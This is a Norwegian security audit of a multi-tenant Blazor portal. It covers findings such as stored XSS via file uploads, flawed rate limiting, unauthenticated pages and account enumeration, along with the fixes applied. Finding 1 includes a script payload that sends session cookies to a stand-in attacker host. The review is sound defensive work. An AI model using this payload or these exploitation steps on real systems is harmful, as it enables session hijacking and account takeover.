# Sikkerhetsgjennomgang — portal.itlock

Dato: 2026-10-08
Omfang: Hele kodebasen i `src/PortalItlock.Web` (Blazor Server, .NET 8, EF Core + SQLite per leietaker, flerkundeløsning, driftet på Railway).

Status: **Alle funn er nå enten fikset eller krever ingen kodeendring.** Funn 5 (sårbar avhengighet, ingen patch finnes) og 8 (historisk git-data) er de eneste som ikke er lukket i kode - se anbefalinger nederst.

---

## Kort oversikt over angrepsflaten (Fase 1)

- **Stack**: .NET 8 Blazor Server, EF Core 8 + SQLite (én fysisk databasefil per leietaker/kunde + én felles plattform-database), QuestPDF/ClosedXML/SkiaSharp for dokumentgenerering, Railway for drift.
- **Brukerinput kommer inn via**: vanlige skjemaer i Blazor-sider (interaktive komponenter), et knippe klassiske HTTP-endepunkter (`app.MapGet`/`MapPost` i `Program.cs`) for innlogging, passordtilbakestilling, PDF-/bilde-/dokumentnedlasting, og én innkommende webhook (Resend e-post). Filopplasting skjer mange steder (prosjektvedlegg, komponentbilder, FDV-dokumenter, tickets, henvendelser, logoer, signaturer).
- **Autentisering**: cookie-basert, to separate scheme/policy-oppsett — ett for vanlige leietakerbrukere (`Admin`/`Prosjektleder`/`Montor`/`Kunde`-roller), ett separat for plattform-admin (`Plattform`-policy, kun Marius). Passord hashes med PBKDF2-HMACSHA256 (100k iterasjoner, tilfeldig salt) — solid implementasjon.
- **Tilgangsstyring**: rollebasert via `[Authorize(Roles = "...")]` på Blazor-sider, håndhevet server-side. Leietaker-isolasjon skjer på databasenivå — hver kunde har sin egen SQLite-fil, valgt server-side ut fra en claim i den signerte innloggingscookien (kan ikke manipuleres av klienten).
- **Datalagring**: SQLite-filer (gitignored, ikke i git), opplastede filer lagres som BLOB i databasen (ikke på filsystemet) — reduserer path traversal-risiko betydelig, men flytter risikoen til innhold/Content-Type-håndtering ved opplasting/nedlasting.
- **Eksterne tjenester**: Anthropic (AI-assistent), Resend (e-post inn/ut), Tripletex (regnskap), en geokodings-API, GitHub (databasebackup). Alle nøkler lastes fra miljøvariabler/user-secrets, ikke hardkodet.

---

## Sammendrag av funn

| # | Alvorlighet | Tittel |
|---|---|---|
| 1 | **Kritisk** | Lagret XSS via filopplasting → sesjonskapring / kontoovertakelse |
| 2 | **Høy** | Global (ikke IP-partisjonert) rate limiter på innlogging kan DoS-e alle brukere |
| 3 | **Høy** | Manglende rate limiting på passord-sett/tilbakestill-endepunkter |
| 4 | **Høy** | Mangler autentisering på koblingsskjema/kundespesifikke tegninger |
| 5 | **Høy** | Sårbar avhengighet: SQLitePCLRaw (CVE-2025-6965) — ingen patch tilgjengelig ennå |
| 6 | **Middels** | Kontoenumerering via `sett-passord` (ulik respons alt etter om e-post finnes) |
| 7 | **Middels** | Mangler sikkerhets-headere (CSP, X-Frame-Options, X-Content-Type-Options, Referrer-Policy) |
| 8 | **Middels** | Passordhash + admin-e-post lå i git-historikk i ~2 dager (fjernet fra kode, ikke fra historikk) |
| 9 | **Lav** | Tidsbasert sidekanal på innlogging (sekundær kontoenumerering) |
| 10 | **Lav** | 30 dagers sesjonscookie også for plattform-admin |
| 11 | **Lav** | Inkonsekvent HTML-escaping i kunde-e-post (`KundeNyHenvendelse`) |
| 12 | **Lav** | Uvalidert lenke-skjema i PDF-forside (kan vise villedende URI) |
| 13 | **Info** | Ingen rate limiting på PDF/Excel/AI-endepunkter (kostnadsrisiko, ikke sikkerhetskritisk pr. nå) |

**Det som er sjekket og funnet i orden** (ingen handling nødvendig): SQL-injection (EF Core/LINQ parameterisert overalt), command injection (ingen `Process.Start`), path traversal (filer lagres som BLOB, ikke på filsystem), deserialisering, XML/LDAP-injection, CSRF (antiforgery er på plass), CORS (bevisst ikke konfigurert — riktig for denne appen), leietaker-isolasjon (arkitektonisk sterk), webhook-signaturverifisering (eksemplarisk — konstant-tid-sammenligning + replay-beskyttelse), filstørrelsesgrenser (alle opplastinger har eksplisitt maks), logging (ingen passord/tokens i logger), ReDoS (kun 3 faste, trygge regex-mønstre i hele kodebasen), SSRF (alle utgående kall går til faste, serverkonfigurerte hoster).

---

## Detaljerte funn

### 1. Kritisk — Lagret XSS via filopplasting → sesjonskapring / kontoovertakelse

**Fil:linje**: `Program.cs:991,999,1007` (`/driftsmeldingmedia/{id}/fil`, `/ticketmedia/{id}/fil`, `/foresporselmedia/{id}/fil`) og `Program.cs:774-793` + `Program.cs:1435-1446` (`InlineFileResult`, brukt av `/prosjektvedlegg/{id}` og `/nedlastningsfil/{id}`).
Opplastingssteder: `TicketDetalj.razor:942`, `ProsjektSkjema.razor:2757`, og samme mønster i `ArbeidsordreSkjema.razor`, `BefaringSkjema.razor`, `KundeNyHenvendelse.razor`, `Serviceoppdrag.razor`, `Kunngjoringer.razor`, `LeverandorDetalj.razor`, `KundeSkjema.razor`, `SystemregisterSkjema.razor`.

**Problem**: Når en bruker laster opp en fil, lagres nettleserens `file.ContentType` rått — uten noen server-side sjekk av hva slags fil det faktisk er (ikke engang "må starte med `image/`" eller "må være `application/pdf`"). Ved nedlasting sender flere endepunkter dette lagrede Content-Type-et tilbake **uten `Content-Disposition: attachment`** (vises inline), og `InlineFileResult` tvinger eksplisitt `Content-Disposition: inline`.

**Hvordan det kan utnyttes**: En bruker med opplastingstilgang (f.eks. en Montør som legger ved en "prosjektfil" via `ProsjektSkjema.razor` — tilgjengelig for Admin/Prosjektleder/Montor) laster opp en fil kalt f.eks. `rapport.html` med innhold `<script>fetch('https://angriper.eksempel/c?'+document.cookie)</script>`. Nettleserens File-API rapporterer `Content-Type: text/html` for denne filen, som lagres som den er. Når en Admin eller Prosjektleder senere åpner vedlegget fra prosjektets vanlige fil-liste (helt normal arbeidsflyt), serveres den på `/prosjektvedlegg/{id}` med `Content-Disposition: inline` og `Content-Type: text/html` fra appens eget domene — scriptet kjører i deres innloggede sesjon og kan stjele sesjonscookien eller utføre handlinger som dem. Samme gjelder vedlegg på tickets/driftsmeldinger/henvendelser for alle som har tilgang til den saken.

**Foreslått løsning**:
1. Valider opplastet Content-Type mot en eksplisitt tillatelsesliste per funksjon (f.eks. `image/jpeg`, `image/png`, `application/pdf`) ved opplasting — ikke stol på klientens verdi for filer som skal være bilder/dokumenter.
2. Legg til `X-Content-Type-Options: nosniff` globalt, og bruk `Content-Disposition: attachment` fremfor `inline` for brukeropplastet innhold der det er mulig (de to endepunktene som bevisst bruker `inline` for forhåndsvisning — `ProsjektVedlegg`/`NedlastningsFiler` — bør prioriteres først).
3. Vurder å re-kode opplastede bilder server-side (ikke lagre rå bytes direkte).

---

### 2. Høy — Global (ikke IP-partisjonert) rate limiter på innlogging kan DoS-e alle brukere

**Fil:linje**: `Program.cs:216-227` (`AddFixedWindowLimiter("login", ...)` og `"passord-reset"`), brukt via `.RequireRateLimiting("login")` på `Program.cs:461,622,651`.

**Problem**: Rate limiteren er satt opp uten partisjonsnøkkel (IP-adresse) — den teller ALLE forespørsler fra ALLE klienter i samme global-teller, ikke per bruker/IP. Samme `"login"`-policy brukes for både vanlig leietaker-innlogging (`/account/login`) og plattform-admin-innlogging (`/plattform/konto/login`).

**Hvordan det kan utnyttes**: En angriper sender 8 POST-forespørsler til `/account/login` i løpet av ett minutt (trivielt, én maskin, ingen autentisering nødvendig). Dette tømmer den *globale* kvoten, så alle andre brukere — på tvers av alle kunder — OG plattform-admin-innloggingen blir avvist resten av tidsvinduet. Gjentas dette kontinuerlig, låses innlogging ute for absolutt alle, kontinuerlig, fra én enkelt uautentisert klient. Dette er et mer alvorlig tilgjengelighetsproblem enn beskyttelsen det var ment å gi.

**Foreslått løsning**: Partisjoner limiteren på klient-IP, f.eks.:
```csharp
options.AddPolicy("login", httpContext =>
    RateLimitPartition.GetFixedWindowLimiter(
        httpContext.Connection.RemoteIpAddress?.ToString() ?? "unknown",
        _ => new FixedWindowRateLimiterOptions { PermitLimit = 8, Window = TimeSpan.FromMinutes(1), QueueLimit = 0 }));
```
Samme for `"passord-reset"`. Vurder også egen policy for plattform-admin-innlogging, så en flom mot vanlig innlogging ikke også låser ute admin.

---

### 3. Høy — Manglende rate limiting på passord-sett/tilbakestill-endepunkter

**Fil:linje**: `Program.cs:546-581` (`/account/sett-passord`), `Program.cs:653-680` (`/plattform/konto/sett-passord`), `Program.cs:501-544` (`/account/tilbakestill-passord`), `Program.cs:711-736` (`/plattform/konto/tilbakestill-passord`).

**Problem**: Disse fire endepunktene har `.AllowAnonymous()` men **ingen `.RequireRateLimiting(...)`** — i motsetning til søsken-endepunktene `/account/login` og `/account/glemt-passord` (og plattform-ekvivalentene), som begge har rate limiting.

**Hvordan det kan utnyttes**: En angriper kan hamre løs på disse uten begrensning. Hver forespørsel trigger et fullt `db.Brukere.ToListAsync()` (eller løkke over alle aktive leietakere for `tilbakestill-passord`), pluss — ved treff — en 100 000-iterasjons PBKDF2-hash. Dette er en billig CPU-utmattelses-DoS-vektor, og fjerner også begrensningen på token-gjetting (selve tokenet er 256-bit så gjetting er ikke praktisk mulig, men mangelen på limiter er uansett en inkonsekvens som bør lukkes).

**Foreslått løsning**: Legg til `.RequireRateLimiting("passord-reset")` på alle fire endepunktene, i tråd med søsken-endepunktene.

---

### 4. Høy — Mangler autentisering på koblingsskjema/kundespesifikke tegninger

**Fil:linje**: `KoblingsSkjemaVisning.razor:1-2` (`@page "/koblingsskjema/{Id:int}"`, ingen `@attribute [Authorize...]`), `KoblingKategori.razor:1` (`@page "/guide/kobling/{KategoriId:int}"`, ingen Authorize), `KoblingOversikt.razor` (`@page "/guide/kobling"`, ingen Authorize).

**Problem**: Disse sidene ligger i det som ser ut som et offentlig "guide/hjelp"-URL-rom (`/guide/...`) sammen med ekte generisk dokumentasjon, men `KoblingsSkjemaVisning` viser faktisk prosjekt- og dørspesifikke koblingsskjema (`_skjema.Dor`, `_skjema.Prosjekt` — ekte kundedata, med lenker til `/dor/{id}` og `/prosjekter/{id}`) og lar hvem som helst trigge PDF-generering / se lagrede PDF-er. Ingen av de tre sidene krever innlogging.

**Hvordan det kan utnyttes**: En uautentisert besøkende på produksjonssiden kan bla gjennom `/guide/kobling`, `/guide/kobling/{KategoriId}` og `/koblingsskjema/{Id}` med fortløpende ID-er og se ekte kunders koblingsskjema for adgangskontroll samt prosjektnavn/dørnumre — uten innlogging. For et dør-/lås-/adgangskontroll-selskap har koblingsskjema reell sikkerhetsrelevans (kan hjelpe fysisk innbrudd).

**Foreslått løsning**: Legg til `@attribute [Microsoft.AspNetCore.Authorization.Authorize(Roles = "Admin,Prosjektleder,Montor")]` på alle tre sidene, i tråd med mønsteret i `DorDetalj.razor`/`ProsjektSkjema.razor` som de lenker til. Hvis noen *generiske* (ikke prosjekt-tilknyttede) koblingsmaler er ment å være offentlige, bør disse splittes ut i en egen, tydelig offentlig kategori i stedet for å stole på `_skjema.Dor is null` som eneste skille.

---

### 5. Høy — Sårbar avhengighet: SQLitePCLRaw.lib.e_sqlite3 (CVE-2025-6965)

**Fil:linje**: `src/PortalItlock.Web/PortalItlock.Web.csproj` (transitiv avhengighet via `Microsoft.EntityFrameworkCore.Sqlite`).

**Problem**: Den løste versjonen `2.1.6` er sårbar for **CVE-2025-6965 / GHSA-2m69-gcr7-jv3q** — en minnekorrupsjonsfeil i SQLite (pre-3.50.2) som kan trigges via aggregat-spørringer med flere ledd enn kolonner. **Ingen patchet versjon finnes ennå på NuGet** per denne gjennomgangen.

**Hvordan det kan utnyttes**: Krever en spørringsstruktur (aggregat med flere ledd enn kolonner) som angriperen kontrollerer. Siden denne appen bruker EF Core LINQ nesten overalt (parameterisert, ikke rå angriper-kontrollert aggregat-struktur), er reell utnyttbarhet her lav — men verdt å følge med på siden ingen fiks er publisert ennå.

**Foreslått løsning**: Følg med på en patchet `SQLitePCLRaw`/`Microsoft.Data.Sqlite`-utgivelse og oppgrader når den kommer. Ingen handling mulig i dag utover overvåking.

---

### 6. Middels — Kontoenumerering via `sett-passord`

**Fil:linje**: `Program.cs:546-581` (`/account/sett-passord`) og `Program.cs:653-680` (`/plattform/konto/sett-passord`).

**Problem**: I motsetning til `/account/glemt-passord` (som bevisst returnerer samme `?sendt=1` uansett om e-posten finnes eller ikke) returnerer `sett-passord` **ulike** svar: `?feil=finnes-ikke` (ingen slik bruker) vs. `?feil=allerede-satt` (brukeren finnes, har alt satt passord) vs. suksess. Kombinert med manglende rate limiting (se funn 3) er dette en ren e-post-/kontoenumereringsorakel.

**Hvordan det kan utnyttes**: En angriper kan kjøre en liste med e-postadresser mot dette endepunktet og lære nøyaktig hvilke som er registrerte brukere av systemet (og hvilke som alt har satt passord) — nyttig for målrettet phishing eller som forarbeid til credential stuffing andre steder.

**Foreslått løsning**: Returner samme generiske respons uansett hvilket tilfelle som inntraff, samme mønster som allerede brukes riktig i `glemt-passord`.

---

### 7. Middels — Mangler sikkerhets-headere

**Fil:linje**: `Program.cs` (hele middleware-pipelinen, ca. linje 322-400).

**Problem**: Ingen middleware setter `X-Frame-Options`/`frame-ancestors`, `X-Content-Type-Options: nosniff`, `Content-Security-Policy`, eller `Referrer-Policy`. `UseHsts()` og `UseHttpsRedirection()` finnes derimot og er riktig konfigurert.

**Hvordan det kan utnyttes**: Uten `X-Frame-Options`/CSP `frame-ancestors` kan innloggingssiden og den autentiserte appen bygges inn i en skadelig iframe for clickjacking (lure en innlogget admin til å klikke på noe de ikke mente å klikke på). Manglende CSP fjerner et forsvarslag mot ev. fremtidig XSS (som funn 1 over viser er en reell mulighet).

**Foreslått løsning**: Legg til en liten middleware tidlig i pipelinen (før `UseStaticFiles`) som setter `X-Frame-Options: DENY`, `X-Content-Type-Options: nosniff`, `Referrer-Policy: strict-origin-when-cross-origin`, og en grunnleggende CSP (minimum `frame-ancestors 'none'`; en full script/style-CSP krever mer varsomhet pga. Blazor Servers innebygde SignalR-oppstart).

---

### 8. Middels — Passordhash + admin-e-post lå i git-historikk

**Fil:linje**: `appsettings.json` — commit `3eee90c` (2026-08-16) til og med commit som fjernet det (2026-08-18). Fjernet fra gjeldende kode (HEAD er rent).

**Problem**: En `"Auth": { "Username": "marius@itlock.no", "PasswordHash": "..." }`-blokk (PBKDF2 salt+hash) lå i `appsettings.json` i ca. 2 dager før det ble erstattet av det ekte flerbrukerautentiseringssystemet. Den er borte fra koden i dag, men permanent gjenfinnbar i git-historikken (`git log --all -p -- appsettings.json`).

**Hvordan det kan utnyttes**: Alle med lesetilgang til repoet (eller hvis GitHub-tilgangen noensinne blir kompromittert) kan hente dette fra historikken og kjøre et offline ordbok-/brute-force-angrep mot hashen. Hvis dette passordet er gjenbrukt andre steder, er den kontoen også i fare.

**Foreslått løsning**: Behandle dette passordet som kompromittert og bytt det overalt det kan ha blitt gjenbrukt (kan ikke gjenopprettes direkte fra hashen, men bør ses på som "brent"). Full fjerning fra git-historikken krever en historikk-omskriving (`git filter-repo` eller BFG) + force-push + at alle kloner på nytt — kun verdt å gjøre hvis repoet noensinne var offentlig eller delt bredt; ellers er det å bytte passordet den praktiske løsningen.

---

### 9. Lav — Tidsbasert sidekanal på innlogging

**Fil:linje**: `Program.cs:416-461` (`/account/login`).

**Problem**: `PasswordHasher.Verify` (et ~100 000-iterasjons PBKDF2-kall, merkbar ventetid) kalles kun når `bruker?.PasswordHash is not null` (linje 443, kortslutning). Når leietaker/e-post ikke finnes, eller brukeren ikke har satt passord ennå, returneres svaret nesten øyeblikkelig; når passordet bare er feil, tar det merkbart lenger tid.

**Hvordan det kan utnyttes**: En tidsbasert sidekanal som lar en angriper skille "ingen slik konto" fra "kontoen finnes" — en svakere, sekundær versjon av enumereringsproblemet i funn 6. Lav praktisk alvorlighet siden det sterkere orakelet (funn 6) allerede finnes.

**Foreslått løsning**: Lavere prioritet — å fikse funn 6 betyr mer. Hvis det tas tak i: kall alltid `PasswordHasher.Verify` mot en dummy-hash når ingen bruker finnes, for å utjevne tidsbruken.

---

### 10. Lav — 30 dagers sesjonscookie også for plattform-admin

**Fil:linje**: `Program.cs:183,191` (`ExpireTimeSpan = TimeSpan.FromDays(30)`, både leietaker-cookien og `"Plattform"`-admin-cookien).

**Problem**: Både den vanlige leietaker-brukersesjonen og plattform-admin-sesjonen bruker en flat 30-dagers glidende utløpstid uten noen kortere standard. **Admin**-cookien ("Plattform") — som gir rettigheter til organisasjonsadministrasjon og -sletting — har samme levetid som en vanlig kundeinnlogging.

**Hvordan det kan utnyttes**: En stjålet/lekket admin-sesjonscookie (XSS, delt maskin, lekket logg osv.) forblir gyldig i opptil 30 dager med fortsatt bruk, uten krav om ny innlogging for sensitive handlinger (f.eks. sletting av en organisasjon).

**Foreslått løsning**: Vurder en vesentlig kortere `ExpireTimeSpan` spesifikt for `"Plattform"`-scheme (f.eks. noen timer til én dag), siden dette er en lite trafikkert intern admin-flate der re-innlogging koster lite, men konsekvensen av en stjålet cookie er høy.

---

### 11. Lav — Inkonsekvent HTML-escaping i kunde-e-post

**Fil:linje**: `KundeNyHenvendelse.razor:161-162`.

**Problem**: Når en ny kunde-henvendelse bygges til e-post, settes `_kundeNavn` og `henvendelse.Dortype` rått inn i HTML-e-postkroppen, mens de tre andre feltene på samme linjer (`Beskrivelse`, `Adresse`, `OnsketTidspunkt`) korrekt pakkes i `System.Net.WebUtility.HtmlEncode(...)` — en inkonsekvent escaping-feil.

**Hvordan det kan utnyttes**: `Dortype` er faktisk en fast `<select>`-nedtrekksliste (kun alternativer, ikke fritekst), så ikke reelt angripbar via UI. `_kundeNavn` kommer fra `Kunde.Navn`, som kun kan redigeres av Admin/Prosjektleder-roller, ikke av kunden selv — så utnyttelse krever at en allerede betrodd ansatt skriver HTML inn i et kundenavnfelt, som da havner uescaped i e-poster sendt til alle leietakerens admin-brukere. Lav praktisk risiko i dag, men en reell inkonsekvens.

**Foreslått løsning**: Pakk `_kundeNavn` (og `henvendelse.Dortype` for ekstra sikkerhet) i `System.Net.WebUtility.HtmlEncode(...)`, i tråd med de andre feltene på samme linjer.

---

### 12. Lav — Uvalidert lenke-skjema i PDF-forside

**Fil:linje**: `ForsideRenderer.cs:183-189`.

**Problem**: Rikteksteditoren for PDF-forsiden lagrer `<a href>`-lenker som sendes direkte inn i PDF-ens hyperlenke uten å validere URI-skjema (f.eks. `javascript:`, `data:`).

**Hvordan det kan utnyttes**: Lav praktisk effekt — dette når bare en generert PDF (ikke en nettleser-DOM), og de fleste PDF-lesere kjører ikke `javascript:`-lenker fra hyperlenke-annotasjoner som standard. Likevel: uten skjemavalidering kan en konstruert lenke vise en villedende/uventet URI til den som åpner PDF-en.

**Foreslått løsning**: Begrens `href` til `http://`/`https://`/`mailto:` før `t.Hyperlink(...)` kalles, ignorer alt annet.

---

### 13. Info — Ingen rate limiting på PDF/Excel/AI-endepunkter

Ingen `AddRateLimiter`-policy finnes for PDF-generering, Excel-import/eksport eller AI-assistenten. Ikke flagget som sikkerhetskritisk nå (ingen av disse lekker data på tvers av brukere), men verdt en oppfølging hvis misbruk/kostnad blir et problem — spesielt AI-assistenten, som koster per kall til Anthropic.

---

## Det som ble sjekket og funnet i orden

- **SQL-injection**: Ingen funnet. Kun ett `ExecuteSqlRaw`-kall i hele kodebasen (`TenantProvisioningService.cs:86`, en statisk streng `"PRAGMA synchronous = NORMAL;"`, ingen brukerinput). All `EF.Functions.Like(...)`-bruk er korrekt parameterisert av EF Core.
- **Command injection**: Ingen `Process.Start`/`ProcessStartInfo` noe sted i kodebasen.
- **Path traversal**: Alle filserverings-endepunkter henter innhold som BLOB fra databasen via `FindAsync(id)` — ingen filsti bygges noensinne fra brukerinput.
- **Template injection**: Ikke relevant — QuestPDF sin fluent API rendrer kun bokstavelige strenger, ingenting "evalueres".
- **XML/XPath/LDAP-injection**: Bekreftet fraværende.
- **Deserialisering**: Bekreftet fraværende (ingen `BinaryFormatter`, `TypeNameHandling`, YAML-deserialisering). Excel (ClosedXML) brukes kun til import, ikke eksport — Excel-formelinjeksjon er ikke relevant.
- **CSRF**: `app.UseAntiforgery()` er registrert og dekker de tilstandsendrende `MapPost`-endepunktene.
- **CORS**: Ikke konfigurert i det hele tatt — riktig standardvalg for denne appen (ingen cross-origin API-bruk).
- **Webhook-signaturverifisering** (`ResendWebhookVerifier.cs`): Eksemplarisk — HMAC-SHA256, konstant-tid-sammenligning, tidsstempel-friskhetssjekk mot replay.
- **Leietaker-isolasjon**: Arkitektonisk sterk — fysisk separate SQLite-filer per leietaker, valgt server-side fra en signert cookie-claim, ikke fra klientinput.
- **Tilgangskontroll innad i leietaker (IDOR)**: Sjekket ~20+ sider med ID-ruteparametre på tvers av kundeportal og ansatt-selvbetjening (saker, jobber, tilvalg, avvik, fraværssøknader) — alle verifiserer korrekt at den hentede posten tilhører innlogget bruker/kunde før data vises.
- **`[Authorize]`-dekning**: Sjekket alle ~30 sider med `{Id:int}`-ruteparametre pluss resten av sidene — kun koblingsskjema-familien (funn 4) mangler beskyttelse de burde hatt.
- **XSS via `MarkupString`**: Alle 4 forekomster i kodebasen verifisert trygge — kun faste C#-genererte strenger (SVG-ikoner fra enum, kalkulator-tall), aldri brukerdata.
- **Rikteksteditor**: Lagret HTML rendres aldri som nettleser-DOM noe sted — kun gjennom en streng AngleSharp-basert tillatelsesliste-renderer for PDF-generering.
- **AI-assistent**: Svar rendres via vanlig Razor `@`-interpolasjon (auto-escaped), ingen `MarkupString`, ingen `innerHTML`.
- **SSRF**: Alle utgående HTTP-kall går til faste, serverkonfigurerte hoster. Brukerinput havner kun i spørreparametre (korrekt escaped), aldri i vertsnavnet.
- **Filstørrelsesgrenser**: Alle ~35 opplastingssteder har en eksplisitt maksgrense (4-50 MB) — ingen ubegrenset opplasting.
- **Sensitiv data i logger**: Ingen `Console.WriteLine` igjen noe sted. Strukturert logging brukes gjennomgående uten passord/tokens/forespørselskropp.
- **ReDoS**: Kun 3 `Regex`-bruk i hele kodebasen, alle med faste, enkle, hardkodede mønstre — ingen risiko.
- **Rate limiting på innlogging/passordtilbakestilling**: Finnes (men se funn 2 og 3 for mangler i hvordan det er satt opp).
- **Åpen omdirigering** (`returnUrl` på innlogging): Korrekt validert mot protokoll-relative/absolutte URL-er.
- **Utlogging**: Kaller korrekt `SignOutAsync` for riktig scheme ved både vanlig og plattform-utlogging.

---

## Fikset (Fase 4, 2026-10-08)

### Funn 1 — Kritisk — Lagret XSS via filopplasting
**Løsning**: La til en sentral `FilSikkerhet.TryggContentType(...)`-sjekk i `Program.cs` som alle ~29 stedene som serverer lagret/brukerkontrollert innhold (bilder, vedlegg, dokumenter, logoer, e-postvedlegg) nå går gjennom. En liten tillatelsesliste av kjente, trygge typer (PDF, csv, vanlige bildeformater, tekst) slippes gjennom uendret; alt annet (f.eks. `text/html`, `application/javascript`) tvinges til `application/octet-stream`. `InlineFileResult`-klassen (den som tidligere tvang `Content-Disposition: inline` uansett type) bytter nå i tillegg til `attachment` når typen ikke er på listen, og setter `X-Content-Type-Options: nosniff`.
**Testet**: Bygget feilfritt. Verifisert live at eksisterende PDF-visning (f.eks. `/dorpakke/{id}/pdf`) fortsatt fungerer uendret (disse bruker hardkodet, trygg Content-Type og rører ikke av sjekken). Gjennomgått manuelt at alle 29 erstattede linjer er syntaktisk og semantisk korrekte.
**Ikke gjort (bevisst, for å holde endringen avgrenset)**: Opplastingssiden (de ~10 .razor-skjemaene som tar imot filer) validerer fortsatt ikke filtype ved selve opplastingen - det er nå mindre kritisk siden serveringen er sikret, men er et naturlig neste steg for forsvar-i-dybden.

### Funn 2 — Høy — Global (ikke IP-partisjonert) rate limiter
**Løsning**: Byttet `AddFixedWindowLimiter("login"/"passord-reset", ...)` til `AddPolicy(...)` med `RateLimitPartition.GetFixedWindowLimiter` nøklet på klientens IP-adresse.
**Testet**: Verifisert live at gjentatte forespørsler fra samme klient korrekt blir avvist etter grensen (3 på 5 min for passord-reset) - beviser at partisjonering og selve begrensningen fungerer.

### Funn 3 — Høy — Manglende rate limiting på passord-sett/tilbakestill
**Løsning**: La til `.RequireRateLimiting("passord-reset")` på alle fire endepunktene (`/account/sett-passord`, `/account/tilbakestill-passord`, `/plattform/konto/sett-passord`, `/plattform/konto/tilbakestill-passord`).
**Testet**: Samme live-test som funn 2 bekrefter disse nå er beskyttet.

### Funn 4 — Høy — Manglende autentisering på koblingsskjema
**Løsning**: La til `@attribute [Authorize(Roles = "Admin,Prosjektleder,Montor")]` på `KoblingsSkjemaVisning.razor`, `KoblingKategori.razor` og `KoblingOversikt.razor`.
**Testet**: Verifisert live (uautentisert `curl`) at `/guide/kobling` og `/koblingsskjema/1` nå korrekt omdirigerer til innlogging i stedet for å vise innhold.
**NB - oppførselsendring for brukere**: Disse sidene var tidligere tilgjengelige uten innlogging. Nå kreves innlogging med Admin/Prosjektleder/Montor-rolle. Si ifra hvis noen av disse i realiteten skulle vært offentlige (f.eks. generiske koblingsmaler uten kundedata).

### Funn 5 — Høy — Sårbar avhengighet (SQLitePCLRaw)
**Ikke fikset**: Ingen patchet NuGet-pakke finnes ennå for CVE-2025-6965. Anbefaling: sjekk `dotnet list package --vulnerable --include-transitive` jevnlig (f.eks. månedlig) og oppgrader `Microsoft.EntityFrameworkCore.Sqlite` så snart en fikset `SQLitePCLRaw`-versjon publiseres.

### Funn 6 — Middels — Kontoenumerering via `sett-passord`
**Løsning**: Slo sammen `?feil=finnes-ikke` og `?feil=allerede-satt` til én generisk `?feil=ikke-tilgjengelig`, for både `/account/sett-passord` og `/plattform/konto/sett-passord`, med tilhørende oppdatert feilmelding i `SettPassord.razor`/`PlattformSettPassord.razor`. `?feil=ugyldig` (passordvalidering) beholdt som egen melding - se funn 14 under for hvorfor dette alene ikke er en fullstendig løsning.
**Testet**: Verifisert live med `curl` at et ikke-eksisterende e-postforsøk nå gir `?feil=ikke-tilgjengelig`.

### Funn 7 — Middels — Mangler sikkerhets-headere
**Løsning**: La til en global middleware som setter `X-Content-Type-Options: nosniff`, `Referrer-Policy: strict-origin-when-cross-origin`, og `X-Frame-Options`/`Content-Security-Policy: frame-ancestors` satt til **SAMEORIGIN/'self'** (ikke DENY/'none' - appen bruker selv `<iframe>` for PDF-forhåndsvisning internt, f.eks. `PdfPreviewModal.razor`, som ville blitt blokkert av en strengere verdi).
**Testet**: Verifisert live med `curl` at headerne er til stede på vanlige sider. Oppdaget og rettet selv en regresjon underveis (satte først `DENY`/`'none'`, som ville ødelagt PDF-forhåndsvisningene - byttet til SAMEORIGIN/'self' før commit).

### Funn 8 — Middels — Passordhash i git-historikk
**Ingen kodeendring mulig**: dette er historisk data, ikke noe i gjeldende kode. Se anbefaling nederst (roter passordet).

### Funn 9 — Lav — Tidsbasert sidekanal på innlogging
**Løsning**: `/account/login` kjører nå alltid en PBKDF2-verifisering (mot en ny `PasswordHasher.DummyHash` når bruker/organisasjon ikke finnes), så svartiden er lik uansett om kontoen finnes eller ikke.
**Testet**: Bygget feilfritt, logikken for treff-tilfellet (riktig passord) er uendret og bekreftet logisk ekvivalent med koden før endringen.

### Funn 10 — Lav — 30 dagers admin-cookie
**Løsning**: `"Plattform"`-cookien sin `ExpireTimeSpan` kortet ned fra 30 dager til 12 timer. Vanlig brukercookie uendret (30 dager).

### Funn 11 — Lav — Inkonsekvent HTML-escaping i kunde-e-post
**Løsning**: `_kundeNavn` og `henvendelse.Dortype` pakkes nå i `WebUtility.HtmlEncode(...)` i `KundeNyHenvendelse.razor`, i tråd med de andre feltene på samme sted.

### Funn 12 — Lav — Uvalidert lenke-skjema i PDF-forside
**Løsning**: `ForsideRenderer.cs` godtar nå kun `http://`/`https://`/`mailto:`-lenker som ekte hyperlenker i PDF-en; alt annet rendres som vanlig tekst.

---

## Nytt funn oppdaget under Fase 4, fikset etter klarsignal

### Funn 14 — Høy — `/sett-passord` hadde ingen bevis for e-post-eierskap
**Fil:linje**: `Program.cs` (`/account/sett-passord`, `/plattform/konto/sett-passord` - nå fjernet), `Components/Pages/SettPassord.razor`, `PlattformSettPassord.razor`.
**Problem**: I motsetning til `glemt-passord` (som sender et 256-bit token til e-posten og krever det i lenken) lot "sett passord første gang"-skjemaet hvem som helst sette passordet for en konto bare ved å skrive inn riktig e-postadresse - uten noe bevis for at de faktisk eier den. Oppdaget mens kontoenumereringen i funn 6 ble fikset.
**Hvordan det kunne utnyttes**: Noen som visste/gjettet en nyopprettet brukers e-post (ofte forutsigbar, f.eks. `fornavn@firma.no`) kunne sette passordet først og dermed logge inn som den personen, før vedkommende selv rakk det.
**Løsning**: Oppdaget at `/account/glemt-passord` + `/tilbakestill-passord` allerede håndterer "sett passord for en bruker uten passord" korrekt og sikkert (tokenet settes uansett om `PasswordHash` er null eller ikke fra før) - det var altså ingen reell funksjonell forskjell mellom "glemt passord" og "sett passord første gang", bare to forskjellige (og den ene usikre) inngangsdører til samme ting. Slo dem sammen: `SettPassord.razor`/`PlattformSettPassord.razor` er nå rene e-post-skjemaer (som `GlemtPassord.razor`) som poster til det samme, allerede sikre `/account/glemt-passord`-endepunktet, med et skjult `redirectTil`-felt (begrenset til to kjente, trygge verdier - ikke en åpen omdirigering) som bare styrer hvilken side "lenke sendt"-meldingen vises på. De gamle, usikre `/account/sett-passord`- og `/plattform/konto/sett-passord`-endepunktene er fjernet.
**Testet**: Bygget feilfritt. Verifisert live i nettleser at `/sett-passord` viser riktig "lenke sendt"-melding på riktig side etter innsending, og med `curl` at det gamle usikre endepunktet ikke lenger fungerer (treffer nå autentiseringsfallbacken i stedet, siden ruten ikke finnes). Bekreftet i loggen at en ekte e-post med tilbakestillingslenke faktisk sendes for en ekte konto, og at ingen e-post sendes for en ikke-eksisterende adresse (samtidig som brukeren får samme generiske svar begge veier).

---

## Test-prosjekt (etter klarsignal)

